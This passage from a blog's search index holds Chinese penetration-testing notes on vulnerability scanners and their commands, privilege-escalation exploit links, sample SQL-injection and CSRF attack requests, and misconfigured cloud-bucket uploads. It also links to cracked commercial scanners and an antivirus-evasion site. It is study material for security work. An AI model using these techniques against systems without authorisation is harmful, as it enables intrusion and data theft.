<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>漏洞发现</title>
    <link href="/2024/11/01/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/"/>
    <url>/2024/11/01/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p>本文偏工具向</p><p>‍</p><h1 id="工具部署"><a href="#工具部署" class="headerlink" title="工具部署"></a>工具部署</h1><h2 id="综合类"><a href="#综合类" class="headerlink" title="综合类"></a>综合类</h2><h3 id="awvs"><a href="#awvs" class="headerlink" title="awvs"></a>awvs</h3><p><code>爬虫强</code>​</p><p><a href="https://get-shell.com/853.html">【漏洞扫描】Acunetix Premium(AWVS) v24.8.24 高级版 - 极核GetShell</a></p><p><img src="/assets/image-20241031133338-ayn0p5i.png" alt="image">​</p><p>‍</p><h3 id="Goby"><a href="#Goby" class="headerlink" title="Goby"></a>Goby</h3><p>（狐狸工具箱，咸鱼上买红队版，<a href="https://gobysec.net/">官网</a>）</p><p><img src="/assets/image-20241031131340-70td52k.png" alt="image">​</p><p>‍</p><h3 id="Nuclei"><a href="#Nuclei" class="headerlink" title="Nuclei"></a>Nuclei</h3><p><img src="/assets/image-20241031131628-h9np6wu.png" alt="image">​</p><p>官网地址：<a href="https://nuclei.projectdiscovery.io/">https://nuclei.projectdiscovery.io/</a><br>项目下载：<a href="https://github.com/projectdiscovery/nuclei">https://github.com/projectdiscovery/nuclei</a></p><p>官方Nuclei-Templates&amp;第三方Nuclei-Templates：<br><a href="https://github.com/projectdiscovery/nuclei-templates">https://github.com/projectdiscovery/nuclei-templates</a><br><a href="https://github.com/ExpLangcn/NucleiTP">https://github.com/ExpLangcn/NucleiTP</a></p><p>‍</p><p>扫描单个目标</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nuclei -target xxx.com<br></code></pre></td></tr></table></figure><p>扫描批量url</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nucle -l urls.txt<br></code></pre></td></tr></table></figure><p>加载对应的poc脚本，可以是当前路径下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">nuclei -t ./test/<br>nuclei -t ./test/test.yaml<br></code></pre></td></tr></table></figure><p>推荐使用，批量检测urls.txt，poc为test.yaml，输出结果result.txt</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nuclei -l urls.txt -t test.yaml -o result.txt<br></code></pre></td></tr></table></figure><p>‍</p><h3 id="Yakit"><a href="#Yakit" class="headerlink" title="Yakit"></a>Yakit</h3><p>可特征可综合</p><p><a href="https://www.yaklang.com/">官网</a>，狐狸工具箱</p><p><img src="/assets/image-20241031131737-iyroixi.png" alt="image">​</p><p>‍</p><h2 id="特征类"><a href="#特征类" class="headerlink" title="特征类"></a>特征类</h2><h3 id="Afrog"><a href="#Afrog" class="headerlink" title="Afrog"></a>Afrog</h3><p><img src="/assets/image-20241031132952-bbhqgxj.png" alt="image">​</p><p><a href="https://github.com/zan8in/afrog">https://github.com/zan8in/afrog</a></p><p>扫描单个目标</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">afrog -t http://example.com -o result.html<br></code></pre></td></tr></table></figure><p>扫描多个目标</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">afrog -T urls.txt -o result.html<br></code></pre></td></tr></table></figure><p>测试单个PoC</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">afrog -t http://example.com -P ./testing/poc-test.yaml -o result.html<br></code></pre></td></tr></table></figure><p>测试多个PoC</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">afrog -t http://example.com -P ./testing/ -o result.html<br></code></pre></td></tr></table></figure><p>‍</p><h3 id="Xray"><a href="#Xray" class="headerlink" title="Xray"></a>Xray</h3><p><code>Poc国内友好</code>​</p><p>狐狸工具箱</p><p><img src="/assets/image-20241031133730-fna45iu.png" alt="image">​</p><p>‍</p><p>‍</p><p>‍</p><h1 id="漏扫方式"><a href="#漏扫方式" class="headerlink" title="漏扫方式"></a>漏扫方式</h1><p>‍</p><h2 id="主动漏扫"><a href="#主动漏扫" class="headerlink" title="主动漏扫"></a>主动漏扫</h2><p>略</p><p>‍</p><h2 id="中转联动"><a href="#中转联动" class="headerlink" title="中转联动"></a>中转联动</h2><p>‍</p><p>主-Awvs设置代理扫描</p><p><img src="/assets/image-20241031134547-dwg6x9a.png" alt="image">​</p><p>‍</p><p>中-Burp设置转发代理</p><p><img src="/assets/image-20241031133847-yncagim.png" alt="image">​</p><p>‍</p><p>副-Xray设置被动扫描</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">.\xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output xx.html<br></code></pre></td></tr></table></figure><p>‍</p><h2 id="被动联动"><a href="#被动联动" class="headerlink" title="被动联动"></a>被动联动</h2><p>主：burp转发代理</p><p><img src="/assets/image-20241031133847-yncagim.png" alt="image">​</p><p>副：Xray设置被动扫描</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">.\xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output xx.html<br></code></pre></td></tr></table></figure><p>‍</p><p>主：Awvs设置代理扫描</p><p><img src="/assets/image-20241031134305-oesdopy.png" alt="image">​</p><p>副-Xray设置被动扫描</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">.\xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output xx.html<br></code></pre></td></tr></table></figure><p>‍</p><p>‍</p><h1 id="POC编写"><a href="#POC编写" class="headerlink" title="POC编写"></a>POC编写</h1><p>‍</p><h2 id="nuclei-POC编写"><a href="#nuclei-POC编写" class="headerlink" title="nuclei_POC编写"></a>nuclei_POC编写</h2><p><a href="https://blog.csdn.net/qq_41315957/article/details/126594572">https://blog.csdn.net/qq_41315957&#x2F;article&#x2F;details&#x2F;126594572</a><br><a href="https://blog.csdn.net/qq_41315957/article/details/126594670">https://blog.csdn.net/qq_41315957&#x2F;article&#x2F;details&#x2F;126594670</a></p><p>大小写敏感<br>使用缩进表示层级关系<br>缩进时不允许使用Tab键，只允许使用空格。<br>缩进的空格数目不重要，只要相同层级的元素左侧对齐即可</p><p>‍</p><p>照着模板改</p><p>‍</p><p>这里有一键生成的插件，但是比较鸡肋，还是照着模板改吧</p><p>nuclei-burp-plugin</p><p><a href="https://github.com/projectdiscovery/nuclei-burp-plugin">https://github.com/projectdiscovery/nuclei-burp-plugin</a></p><p>（可以直接在burp自带的插件商店里下载）</p><p>‍</p><p>‍</p><p>‍</p><h2 id="Xray-POC编写"><a href="#Xray-POC编写" class="headerlink" title="Xray_POC编写"></a>Xray_POC编写</h2><p>xray poc模板生成(类似nuclei bp插件)：<a href="https://poc.xray.cool/">https://poc.xray.cool/</a><br>xray poc官方参考：<a href="https://docs.xray.cool/plugins/practice/poc/Template">https://docs.xray.cool/plugins/practice/poc/Template</a><br>Xray Poc如何编写：<a href="https://mp.weixin.qq.com/s/XeF10F5xw19AymX34vALIw">https://mp.weixin.qq.com/s/XeF10F5xw19AymX34vALIw<br>https://cloud.tencent.com/developer/article/1949351</a></p><p>‍</p><p>‍</p><p>‍</p><p>写POC时如遇命令执行不回显等情况，可以ping DNSlog以及ceye.io平台</p>]]></content>
    
    
    <categories>
      
      <category>漏洞发现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞发现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>系统攻防</title>
    <link href="/2024/10/01/%E7%B3%BB%E7%BB%9F%E6%94%BB%E9%98%B2/"/>
    <url>/2024/10/01/%E7%B3%BB%E7%BB%9F%E6%94%BB%E9%98%B2/</url>
    
    <content type="html"><![CDATA[<h1 id="系统攻防"><a href="#系统攻防" class="headerlink" title="系统攻防"></a>系统攻防</h1><h1 id="漏扫项目"><a href="#漏扫项目" class="headerlink" title="漏扫项目"></a>漏扫项目</h1><p>‍</p><h2 id="远程"><a href="#远程" class="headerlink" title="远程"></a>远程</h2><h3 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h3><p>Nessus号称是世界上最流行的漏洞扫描程序，全世界有超过75000个组织在使用它。该工具提供完整的电脑漏洞扫描服务，并随时更新其漏洞数据库。Nessus不同于传统的漏洞扫描软件，Nessus可同时在本机或远端上遥控，进行系统的漏洞分析扫描。</p><h4 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h4><p><a href="https://blog.csdn.net/2302_82189125/article/details/138159165?ops_request_misc=%257B%2522request%255Fid%2522%253A%25228B491D69-7DCC-4E44-B45A-615B101921EE%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=8B491D69-7DCC-4E44-B45A-615B101921EE&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-138159165-null-null.142%5Ev100%5Econtrol&utm_term=Nessus&spm=1018.2226.3001.4187">漏洞扫描神器：Nessus 保姆级教程（附破解步骤）-CSDN博客</a></p><p><img src="/assets/image-20241012143227-yw7hpt8.png" alt="image">​</p><h3 id="Nexpose"><a href="#Nexpose" class="headerlink" title="Nexpose"></a>Nexpose</h3><p>Nexpose是Rapid7出品，一款著名的、极佳的商业漏洞扫描工具。跟一般的扫描工具不同，Nexpose自身的功能非常强大，可以更新其漏洞数据库，以保证最新的漏洞被扫描到。漏洞扫描效率非常高，对于大型复杂网络，可优先考虑使用；对于大型复杂网络，可以优先考虑使用。可以给出哪些漏洞可以被 Metasploit Exploit，哪些漏洞在 Exploit-db里面有exploit的方案。可以生成非常详细的，非常强大的Report，涵盖了很多统计功能和漏洞的详细信息。虽然没有Web应用程序扫描，但Nexpose涵盖自动漏洞更新以及微软补丁星期二漏洞更新。</p><h4 id="部署-1"><a href="#部署-1" class="headerlink" title="部署"></a>部署</h4><p><a href="https://www.fujieace.com/hacker/rapid7-nexpose.html">https://www.fujieace.com/hacker/rapid7-nexpose.html</a></p><p>直接官网提交试用信息<br>邮箱注册：<a href="https://accounts.zoho.com.cn/">https://accounts.zoho.com.cn/</a><br>接受许可证key</p><p><a href="https://blog.csdn.net/m0_63147799/article/details/140588545?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522FB794AB9-8025-4219-8C01-90B03B52F96A%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=FB794AB9-8025-4219-8C01-90B03B52F96A&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~times_rank-4-140588545-null-null.142%5Ev100%5Econtrol&utm_term=Nexpose&spm=1018.2226.3001.4187">漏洞扫描工具nexpose安装及使用(KOS)_nexpose扫描api-CSDN博客</a></p><p><img src="/assets/image-20241012143347-7qlba3k.png" alt="image">​</p><p><img src="/assets/image-20241012143625-ju1446n.png" alt="image">​</p><p><img src="/assets/image-20241012143639-459up8h.png" alt="image">​</p><p><img src="/assets/image-20241012143710-6ixyqao.png" alt="image">​</p><p><img src="/assets/image-20241012143723-cdc5xvr.png" alt="image">​</p><p>‍</p><h3 id="Goby"><a href="#Goby" class="headerlink" title="Goby"></a>Goby</h3><p>Goby是一款新的网络安全测试工具，由赵武Zwell（Pangolin、JSky、FOFA作者）打造，它能够针对一个目标企业梳理最全的攻击面信息，同时能进行高效、实战化漏洞扫描，并快速的从一个验证入口点，切换到横向。能通过智能自动化方式，帮助安全入门者熟悉靶场攻防，帮助攻防服务者、渗透人员更快的拿下目标。</p><h4 id="部署-2"><a href="#部署-2" class="headerlink" title="部署"></a>部署</h4><p><a href="https://blog.csdn.net/gitblog_09706/article/details/142003753?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522A1F61CBA-DBC1-4D1A-ABB2-4D150C75855B%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=A1F61CBA-DBC1-4D1A-ABB2-4D150C75855B&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~times_rank-1-142003753-null-null.142%5Ev100%5Econtrol&utm_term=goby%E7%BA%A2%E9%98%9F%E4%B8%93%E7%89%88%E7%A0%B4%E8%A7%A32024&spm=1018.2226.3001.4187">Goby红队版：强大的安全测试工具集-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_47493625/article/details/136118811?ops_request_misc=%257B%2522request%255Fid%2522%253A%25221DCE7DAD-B511-49B3-9922-03BCA044CE80%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=1DCE7DAD-B511-49B3-9922-03BCA044CE80&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~times_rank-1-136118811-null-null.142%5Ev100%5Econtrol&utm_term=goby%E5%AE%89%E8%A3%85&spm=1018.2226.3001.4187">【漏洞扫描】网络空间安全工具—Goby 快速入门使用指南_goby漏洞扫描工具-CSDN博客</a></p><p><img src="/assets/image-20241012144730-7zbvrbw.png" alt="image">​</p><p>‍</p><h2 id="本地"><a href="#本地" class="headerlink" title="本地"></a>本地</h2><p>本地执行漏洞自检（溢出提权等）</p><p>‍</p><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h4 id="网站"><a href="#网站" class="headerlink" title="网站"></a>网站</h4><p><a href="https://i.hacking8.com/tiquan(%E7%BD%91%E7%AB%99%E5%B7%B2%E7%BB%8F%E5%81%9C%E8%BF%90)">https://i.hacking8.com/tiquan(网站已经停运)</a></p><p>这里找了另外两个</p><p><a href="https://gh0st.cn/AssistTool">Windows进程对比杀软信息&amp;辅助提权补丁对比 · Chen&apos;s Blog (gh0st.cn)</a></p><p><a href="http://bypass.tidesec.com/exp/">潮影在线免杀平台 (tidesec.com)</a></p><h4 id="项目"><a href="#项目" class="headerlink" title="项目"></a>项目</h4><p><a href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a></p><p>‍</p><p>‍</p><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="项目-1"><a href="#项目-1" class="headerlink" title="项目"></a>项目</h4><p><a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p><p>需要将项目中的.sh文件上传到目标网站上然后执行</p><p>‍</p><h3 id="POC-CVE"><a href="#POC-CVE" class="headerlink" title="POC&amp;CVE"></a>POC&amp;CVE</h3><p>往年的cve漏洞poc可以在这里查到</p><p><a href="https://github.com/1nnocent1/PoC-in-GitHub">https://github.com/1nnocent1/PoC-in-GitHub</a></p><p>‍</p><p>Win10-漏洞提权-CVE-2021-1732</p><p><a href="https://github.com/KaLendsi/CVE-2021-1732-Exploit">https://github.com/KaLendsi/CVE-2021-1732-Exploit</a></p><p>Win08-漏洞提权-CVE-2019-1458</p><p><a href="https://github.com/rip1s/CVE-2019-1458">https://github.com/rip1s/CVE-2019-1458</a></p><p>Linux-漏洞提权-CVE-XXXX-XXXX</p><p><a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p>]]></content>
    
    
    <categories>
      
      <category>系统攻防</category>
      
    </categories>
    
    
    <tags>
      
      <tag>系统攻防</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>API攻防</title>
    <link href="/2024/09/30/API%E6%94%BB%E9%98%B2/"/>
    <url>/2024/09/30/API%E6%94%BB%E9%98%B2/</url>
    
    <content type="html"><![CDATA[<h1 id="API攻防"><a href="#API攻防" class="headerlink" title="API攻防"></a>API攻防</h1><p>‍</p><h1 id="什么是API？"><a href="#什么是API？" class="headerlink" title="什么是API？"></a>什么是API？</h1><p><a href="https://apifox.com/apiskills/understanding-apis/">什么是 API？深入了解 API 的概念和应用 (apifox.com)</a></p><p>‍</p><p>‍</p><p>‍</p><h1 id="API面临的安全问题"><a href="#API面临的安全问题" class="headerlink" title="API面临的安全问题"></a>API面临的安全问题</h1><p>‍</p><h2 id="1、未经授权的访问"><a href="#1、未经授权的访问" class="headerlink" title="1、未经授权的访问"></a>1、未经授权的访问</h2><p>未经授权的访问是 API 安全中最常见的问题之一。攻击者可以使用未经授权的凭据或者伪造请求，获取对受保护的资源的访问权限。这种攻击可能导致敏感信息泄露、恶意操作等风险。</p><p>以下是一个未经授权的访问示例，攻击者使用伪造的请求头部信息获取了对资源的访问权限：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/api/resources/xx</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>api.example.com<br><span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">: </span>Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c<br></code></pre></td></tr></table></figure><p>‍</p><p>‍</p><h2 id="2、SQL-注入和其他注入攻击"><a href="#2、SQL-注入和其他注入攻击" class="headerlink" title="2、SQL 注入和其他注入攻击"></a>2、SQL 注入和其他注入攻击</h2><p>SQL 注入是一种常见的攻击方式，攻击者通过在请求参数中注入恶意的 SQL 语句，获取敏感信息或者修改数据库记录。其他注入攻击包括跨站点脚本攻击（XSS）等，攻击者可以在请求参数中注入恶意的脚本代码，获取敏感信息或者执行恶意操作。</p><p>以下是一个 SQL 注入攻击的示例，攻击者在请求参数中注入恶意的 SQL 语句，获取了数据库中的敏感信息：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">GET</span> /api/resources?<span class="hljs-attribute">id</span>=1;SELECT * <span class="hljs-keyword">FROM</span><span class="hljs-built_in"> users </span>WHERE <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;admin&#x27;</span>-- HTTP/1.1<br>Host: api.example.com<br>Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c<br></code></pre></td></tr></table></figure><p>‍</p><p>‍</p><h2 id="3、跨站点请求伪造（CSRF）"><a href="#3、跨站点请求伪造（CSRF）" class="headerlink" title="3、跨站点请求伪造（CSRF）"></a>3、跨站点请求伪造（CSRF）</h2><p>跨站点请求伪造（CSRF）是一种攻击方式，攻击者通过在受信任网站上伪造请求，使用户在不知情的情况下执行恶意操作。例如，攻击者可以在电子邮件中包含一个恶意链接，用户点击链接后会在受信任的网站上执行恶意操作。</p><p>以下是一个 CSRF 攻击的示例，攻击者伪造了一个请求，向受信任的网站提交了恶意数据：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;https://api.example.com/api/resources&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;恶意数据&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;amount&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1000000&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>‍</p><p>‍</p><h2 id="4、拒绝服务攻击（DoS）"><a href="#4、拒绝服务攻击（DoS）" class="headerlink" title="4、拒绝服务攻击（DoS）"></a>4、拒绝服务攻击（DoS）</h2><p>拒绝服务攻击（DoS）是一种攻击方式，攻击者通过向 API 发送大量请求，使得 API 无法正常工作。这种攻击可能导致 API 无法响应正常的请求，影响服务的可用性和稳定性。</p><p>以下是一个 DoS 攻击的示例，攻击者向 API 发送了大量的请求，占用了大量的资源：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html">GET /api/resources?id=1 HTTP/1.1<br>Host: api.example.com<br><br>GET /api/resources?id=2 HTTP/1.1<br>Host: api.example.com<br><br>GET /api/resources?id=3 HTTP/1.1<br>Host: api.example.com<br><br>...<br></code></pre></td></tr></table></figure><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><h1 id="API分类特征"><a href="#API分类特征" class="headerlink" title="API分类特征"></a>API分类特征</h1><h2 id="SOAP-WSDL"><a href="#SOAP-WSDL" class="headerlink" title="SOAP - WSDL"></a>SOAP - WSDL</h2><p><img src="/assets/image-20241011144731-zjbyk8s.png" alt="image">​</p><p><img src="/assets/image-20241011144745-8sa30ji.png" alt="image">​</p><h2 id="OpenApi-Swagger"><a href="#OpenApi-Swagger" class="headerlink" title="OpenApi - Swagger"></a>OpenApi - Swagger</h2><p><img src="/assets/image-20241011144847-k29far0.png" alt="image">​</p><p><img src="/assets/image-20241011144907-u2lzdmi.png" alt="image">​</p><p>‍</p><p>‍</p><p>‍</p><h1 id="API检测项目"><a href="#API检测项目" class="headerlink" title="API检测项目"></a>API检测项目</h1><h2 id="工具自动化-SOAP-WSDL"><a href="#工具自动化-SOAP-WSDL" class="headerlink" title="工具自动化-SOAP - WSDL"></a>工具自动化-SOAP - WSDL</h2><h3 id="Postman-联动burp-xray"><a href="#Postman-联动burp-xray" class="headerlink" title="Postman 联动burp+xray"></a>Postman 联动burp+xray</h3><p><img src="/assets/image-20241011145011-eyi4ctv.png" alt="image">​</p><p><img src="/assets/image-20241011145022-iw2wss9.png" alt="image">​</p><p><img src="/assets/image-20241011145034-t0r9ojq.png" alt="image">​</p><p><img src="/assets/image-20241011145052-xw3im4x.png" alt="image">​</p><p>在运行之前需要在postman开启代理</p><p><img src="/assets/image-20241011145109-4qvnb31.png" alt="image">​</p><p>burp代理</p><p><img src="/assets/image-20241011145131-c60967n.png" alt="image">​</p><p><img src="/assets/image-20241011145509-0xlpyld.png" alt="image">​</p><p><img src="/assets/image-20241011145550-2k7zi2h.png" alt="image">​</p><p><code>xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output exxample.html</code>​</p><p><img src="/assets/image-20241011154324-fjjtm85.png" alt="image">​</p><p>‍</p><h3 id="APIKit插件-可联动xray"><a href="#APIKit插件-可联动xray" class="headerlink" title="APIKit插件(可联动xray)"></a>APIKit插件(可联动xray)</h3><p><img src="/assets/image-20241011154414-pdidjcu.png" alt="image">​</p><p><img src="/assets/image-20241011154441-qpol7kp.png" alt="image">​</p><p><img src="/assets/image-20241011154508-oligjfr.png" alt="image">​</p><p>‍</p><h2 id="工具自动化-OpenApi-Swagger"><a href="#工具自动化-OpenApi-Swagger" class="headerlink" title="工具自动化-OpenApi - Swagger"></a>工具自动化-OpenApi - Swagger</h2><p>同上</p><h2 id="工具自动化-RESTful-v1-api"><a href="#工具自动化-RESTful-v1-api" class="headerlink" title="工具自动化-RESTful - &#x2F;v1&#x2F;api&#x2F;"></a>工具自动化-RESTful - &#x2F;v1&#x2F;api&#x2F;</h2><p>vAPI 编写了专门的测试 Collection</p><p><a href="https://raw.githubusercontent.com/roottusk/vapi/master/postman/vAPI.postman/_collection.json">https://raw.githubusercontent.com/roottusk/vapi/master/postman/vAPI.postman\_collection.json</a></p><p><img src="/assets/image-20241011154609-cc4qkfw.png" alt="image">​</p><p>同上</p><p>‍</p><h1 id="实战案例"><a href="#实战案例" class="headerlink" title="实战案例"></a>实战案例</h1><p><a href="assets/%E7%AC%AC91-1%E5%A4%A9%EF%BC%9ASOAPSwaggerRESTful%E6%8C%96%E6%8E%98%E6%A1%88%E4%BE%8B-20241011154949-lt5tey5.pdf">SOAPSwaggerRESTful挖掘案例.pdf</a></p>]]></content>
    
    
    <categories>
      
      <category>API攻防</category>
      
    </categories>
    
    
    <tags>
      
      <tag>API攻防</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>云上攻防</title>
    <link href="/2024/09/30/%E4%BA%91%E4%B8%8A%E6%94%BB%E9%98%B2/"/>
    <url>/2024/09/30/%E4%BA%91%E4%B8%8A%E6%94%BB%E9%98%B2/</url>
    
    <content type="html"><![CDATA[<h1 id="云上攻防"><a href="#云上攻防" class="headerlink" title="云上攻防"></a>云上攻防</h1><h1 id="云服务"><a href="#云服务" class="headerlink" title="云服务"></a>云服务</h1><h2 id="对象储存-Bucket桶"><a href="#对象储存-Bucket桶" class="headerlink" title="对象储存-Bucket桶"></a>对象储存-Bucket桶</h2><p>对象存储用来存储数据的(图片、视频、音频等，网站在从这个对象存储桶里调用的这些数据)，告别传统的数据放在自己服务器硬盘上。</p><h3 id="权限配置不当-任意文件上传"><a href="#权限配置不当-任意文件上传" class="headerlink" title="权限配置不当-任意文件上传"></a>权限配置不当-任意文件上传</h3><p><img src="/assets/image-20241014165232-39qhq6s.png" alt="image">​</p><p><img src="/assets/image-20241014165422-df2q7b3.png" alt="image">​</p><p><img src="/assets/image-20241014165435-jlhvvrb.png" alt="image">​</p><p><img src="/assets/image-20241014165517-84f32o6.png" alt="image">​</p><p><img src="/assets/image-20241014165530-qm6q66g.png" alt="image">​</p><p><img src="/assets/image-20241014165540-5gj523k.png" alt="image">​</p><p><img src="/assets/image-20241014165551-xmgnahw.png" alt="image">​</p><p>设置为公共读或公共读写：可完整访问但不显示完整结构目录，即必须知道具体文件名才能读</p><p><img src="/assets/image-20241014165630-gy1sx16.png" alt="image">​</p><p><img src="/assets/image-20241014165645-ynh9xmo.png" alt="image">​</p><p>设置ListObject显示完整结构目录</p><p><img src="/assets/image-20241014165749-8drsss7.png" alt="image">​</p><p><img src="/assets/image-20241014165804-ri2unh6.png" alt="image">​</p><p><img src="/assets/image-20241014170539-v8h80o4.png" alt="image">​</p><p>公共读写直接PUT文件任意上传</p><p><img src="/assets/image-20241014171144-rl9iwcx.png" alt="image">​</p><p><img src="/assets/image-20241014171153-1u9u3m0.png" alt="image">​</p><p>提示403是因为没有写的权限，只是读的。</p><p><img src="/assets/image-20241014171226-zem5yoe.png" alt="image">​</p><p><img src="/assets/image-20241014171241-zsn4jhe.png" alt="image">​</p><p>成功上传</p><p><img src="/assets/image-20241014171318-lm3rb7t.png" alt="image">​</p><p>‍</p><p>‍</p><h3 id="域名解析接管"><a href="#域名解析接管" class="headerlink" title="域名解析接管"></a>域名解析接管</h3><p><img src="/assets/image-20241014171432-lzzvnhq.png" alt="image">​</p><p><img src="/assets/image-20241014171441-4w3qke8.png" alt="image">​</p><p><img src="/assets/image-20241014171456-g64b1hm.png" alt="image">​</p><p><img src="/assets/image-20241014171548-8qzmzj3.png" alt="image">​</p><p>需要等待一会才会解析生效</p><p><img src="/assets/image-20241014171631-brertk7.png" alt="image">​</p><p><img src="/assets/image-20241014171648-5htkhbc.png" alt="image">​</p><p>如何在实战中判断对方域名绑定了OSS存储桶？</p><p><img src="/assets/image-20241014171941-jq92y1x.png" alt="image">​</p><p><img src="/assets/image-20241014171951-1jx6pgx.png" 